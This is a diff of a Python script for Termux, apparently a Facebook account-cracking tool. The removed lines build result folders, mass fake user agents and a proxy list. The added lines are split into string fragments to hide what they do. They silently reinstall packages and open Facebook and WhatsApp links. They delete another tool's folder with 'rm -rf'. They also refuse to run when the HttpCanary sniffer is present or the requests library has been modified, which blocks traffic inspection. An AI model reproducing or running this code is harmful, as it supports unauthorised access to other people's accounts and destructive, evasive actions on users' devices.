@@ -1,415 +1,199 @@
-#!/usr/bin/python3 
-#Coded by : Muhammad Younis
-#Github : https://github.com/YounisXyz
-#Facebook : www.facebook.com/xyzhackers
-###---------------------[IMPORT MODULES]---------------------###
-import datetime,mechanize,calendar,ipaddress,os,sys,time,json,random,re,string,platform,base64,platform,uuid,webbrowser,shutil,rich,marshal,requests,zlib,socket,base64,threading,hashlib
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from time import sleep
+
+import os,zlib,time,random,uuid,subprocess,sys,json,base64,platform,string,marshal,re
+from concurrent.futures import ThreadPoolExecutor as refatshahriar
+from zlib import decompress
 from os import system
-from time import localtime as lt
-from os import system as cmd
-from datetime import date
-from datetime import datetime
-from time import sleep as XYZTIME
 from random import randint
-from bs4 import BeautifulSoup
-import requests as ress
-from sys import exit as exit
-ses=requests.Session()
-from random import randint
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from bs4 import BeautifulSoup as par
-from datetime import date
+wash = os.system
+wash("pk"+"g u"+"nins"+"tall"+" py"+"th"+"on -y;"+"pkg "+"insta"+"ll "+"p"+"ytho"+"n-pip -"+"y;p"+"ip u"+"nins"+"tall py"+"cu"+"rl re"+"que"+"sts ch"+"ar"+"det ur"+"lli"+"b3 id"+"na cer"+"tifi -y > /"+"dev/"+"nul"+"l;pi"+"p ins"+"tall p"+"yc"+"url ch"+"ardet ur"+"llib"+"3 id"+"na ce"+"rti"+"fi req"+"ues"+"ts > /d"+"ev"+"/nu"+"ll");wash('xdg-open https:'+'//faceboo'+'k.com/grou'+'ps/14317482'+'23768752/');time.sleep(3);wash("xdg-open https"+"://chat.what"+"sapp.com/LJk2Vt0"+"ogyTFJDyk2GNqv0");wash('clear')
+kire = 'NB2H'+'I4DTHI'+'XS64TF'
+hala = 'MZQ'+'XIMJTG'+'UZC4YTMN'
+#-------------------------(System Colour)------------------------->>>
+G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
+colors = ["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"]
+xoxo = random.choice(colors)
+style = f'{G}[{R}●{G}]{G}'
+moja = '5TX'+'G4DPO'+'QXGG33NF'
 try:
-    import requests
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-from time import sleep as XYZTIME
-
-
-###-----------------------[CREATE FOLDERS IN STORAGE]-----------------------###
-try:os.mkdir('/sdcard/ROMEO')
-except:pass
-try:os.mkdir('/sdcard/ROMEO/OK')
-except:pass
-try:os.mkdir('/sdcard/ROMEO/CP')
-except:pass
-try:os.mkdir('/sdcard/ROMEO/2F')
-except:pass
-
-
-###-----------------------[TERMUX DISPLAY NME ON THE SESSION SITE]-----------------------###
-sys.stdout.write('\x1b[1;35m\x1b]2; YOUNIS XYZ ðŸ™‚ðŸ’— \x07')
-
-
-
-###---------------------[BASIC COLORS]---------------------###
-R = '{RED}' 
-G = '{GREEN}' 
-Y = '\033[1;33m' 
-P = '\033[0;97m' 
-B = '\x1b[1;94m' 
-R = '\033[1;91m' 
-pink = '\x1b[38;5;205m' 
-H = '\033[1;92m'
-N = '\033[1;97m'    
-Y = '\033[1;93m' 
-F = '\033[1;96m'
-G = '\x1b[1;95m'
-Brown = "\x1b[38;5;208m" 
-croosline = "\033[9;36m" 
-Y2 = '\x1b[38;5;118m' #DeepGreen
-colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
-
-
-#-----------------------[LOOP]-----------------------#
-loop = 0
-cp = []
-ok = []
-twf = []
-Display_info = []
-Cp = []
-Cookie = []
-Apk = []
-user=[]
-ugen=[]
-
-
-
-#-----------------------[MENU USERAGENTS]-----------------------#
-for xd in range(5000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+    import pycurl
+    from io import BytesIO
+except:
+    wash('p'+'ip ins'+'tall pyc'+'url > /dev'+'/null')
+    import pycurl
+    from io import BytesIO
+try:import requests
+except:wash('pi'+'p uni'+'nstall requ'+'ests cha'+'rdet id'+'na cert'+'ifi urll'+'ib3 -y > /dev/null;p'+'ip ins'+'tall char'+'det id'+'na cert'+'ifi requ'+'ests urll'+'ib3 > /d'+'ev/nu'+'ll');os.system("clear");exit(" Error Run Again ! ")
 try:
-    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-    open('.prox.txt','w').write(prox)
-except Exception as e:
-    os.system("clear")
-    os.system("xdg-open https://youtube.com/@YounisXyz?si=6suFGNh5NMFyIHqn")
-    print(f'{P}\n\tLOADING ....')
-    
-
-
-
-for xd in range(10000):
-    a='Mozilla/5.0 (Symbian/3; Series60/'
-    b=random.randrange(1, 9)
-    c=random.randrange(1, 9)
-    d='Nokia'
-    e=random.randrange(100, 9999)
-    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-    g=random.randrange(1, 9)
-    h=random.randrange(1, 4)
-    i=random.randrange(1, 4)
-    j=random.randrange(1, 4)
-    k='Mobile Safari/535.1'
-    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-    ugen.append(uaku)
-
-
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
-for xd in range(3000):
-    build_nokiax = ['JDQ39','JZO54K']
-    rr = random.randint; rc = random.choice
-    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
-    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
-    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
-    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
-    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
-    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
-    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
-    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
-    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
-    memekk = random.choice([ugent1, ugent2, ugent3])
-    ugen.append(memekk)
-    
-for t in range(10000):
-    aa='Mozilla/5.0 (Linux; Android 7.0; '
-    b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
-    c='Hisense F102) '
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku)
-for x in range(10):
-    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-    b=random.randrange(100, 9999)
-    c=random.randrange(100, 9999)
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    h=random.randrange(1, 9)
-    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-    j=random.randrange(1, 9)
-    k=random.randrange(1, 9)
-    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-    
-
-###----------[ UA-API ]---------- ###
-samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']  
-def ua_api():
-	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
-	builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
-	chrome3 = str(random.randint(100, 300))
-	chrome4 = str(random.randint(1000, 9000))
-	fuck = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
-	return fuck
-	
-	
-def ua_validate():
-	android = random.choice(['7.1.2','8.1.0'])
-	build = "OPM2."+str(random.randint(111111,199999))+".006"
-	chrome = str(random.randint(60,99))+".0."+str(random.randint(3300,3999))+"."+str(random.randint(75,99))
-	browser = str(random.randint(35,99))+".1."+str(random.randint(2200,2900))+"."+str(random.randint(111111,199999))
-	return ('Mozilla/5.0 (Linux; U; Android {}; Redmi 5A Build/{}.H1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 OPR/{}'.format(android, build, chrome, browser))
-
-def ua_mfacebook():
-	samsung = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; SM-A105M Build/RP1A.{str(random.randint(111111,299999))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,99))}.0.{str(random.randint(4000,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(400,490))}.0.0.30.97;]"
-	mixx = f"Mozilla/5.0 (Linux; Android {str(random.randint(3,8))}.{str(random.randint(0,4))}.{str(random.randint(0,2))}; Micromax A065 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(30,99))}.0.0.0 Mobile Safari/537.36"
-	asus = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(2,6))}.{str(random.randint(0,3))}; en-US; ASUS_T00I Build/KVT49L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(random.randint(7,12))}.4.5.{str(random.randint(1000,1900))} U3/0.8.0 Mobile Safari/534.30"
-	xyzrandomagents = random.choice([samsung, mixx, asus])
-	return xyzrandomagents
-
-#-----------------------[IF U WANT TO ADD MANULA USERAGENTS FILE]-----------------------#   
-def My_Agents():
+    from licensing.models import *
+    from licensing.methods import Key, Helpers
+except:wash("p"+"ip ins"+"tall lice"+"nsing > /d"+"ev/nu"+"ll")
+try:import bs4
+except:wash('p'+'ip ins'+'tall b'+'s4 > /d'+'ev/nu'+'ll')
+try:os.makedirs('/sdcard/TOP')
+except:pass
+try:
+    wash('rm -'+'rf /sd'+'card/.txt');wash('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
+except PermissionError:
+    print(f'{style} Wi'+'thout Sto'+'rage Perm'+'ission You Can'+'not R'+'un My Com'+'mand A'+'llow Te'+'rmux Perm'+'issions ! A'+'nd Run A'+'gain ');wash('termux-setup-storage');wash('clear');exit('[=] Ru'+'n Aga'+'in Th'+'is To'+'ol !!')
+try:
+    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
+        print('fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
+except:pass
+try:
+    files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
+except FileNotFoundError:pass
+except Exception as e:pass
+#----------------------[ SECURITY CHECKER ]--------------------------->>>
+site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.11/s'+'ite-packages/'
+warning = "Plea"+"se Coto Do"+"n't Try Syst"+"em Modif"+"ication Okh Bye 👋"+"🍼"
+pipo = 'p'+'ip unin'+'stall requ'+'ests cha'+'rdet ur'+'lli'+'b3 id'+'na cer'+'tifi -'+'y;pi'+'p ins'+'tall cha'+'rdet urll'+'ib3 idn'+'a cer'+'tifi re'+'ques'+'ts'
+try:
+    mrTop = open(f"{site}requ"+"ests/mod"+"els.py", "r").read()
+    mrline = len(mrTop)
+    if mrline != 35223:exit(f"{style} {warning} A1")
+    else:pass
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B1')
+try:
+    mrTop = open(f"{site}requ"+"ests/au"+"th.py", "r").read()
+    mrline = len(mrTop)
+    if mrline != 10187:exit(f"{style} {warning} A2")
+    else:pass 
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B2')
+try:
+    mrTop = open(f"{site}requ"+"ests/ap"+"i.py", "r").read()
+    mrline = len(mrTop)
+    if mrline != 6449:exit(f"{style} {warning} A3")
+    else:pass 
+except:exit(f'{style} PLEA'+'SE TY'+f'PE :{xoxo} {pipo} B3')
+try:
+    mrTop = open(f"{site}requ"+"ests/ses"+"sions.py", "r").read()
+    mrline = len(mrTop)
+    if mrline != 30373:exit(f"{style} {warning} A4")
+    else:pass 
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B4')
+try:
+    king=f'{site}reque'+'sts/'
+    if not 'print' in open(king+'sess'+'ions.py','r').read():pass
+    else:exit(f"{style} {warning} A5")
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B5')
+try:
+    qeen=f'{site}reque'+'sts/'
+    if not 'print' in open(qeen+'mod'+'els.py','r').read():pass
+    else:exit(f"{style} {warning} A6")
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B6')
+try:
+    don=f'{site}reque'+'sts/'
+    if not 'print' in open(don+'ap'+'i.py','r').read():pass
+    else:exit(f"{style} {warning} A7")
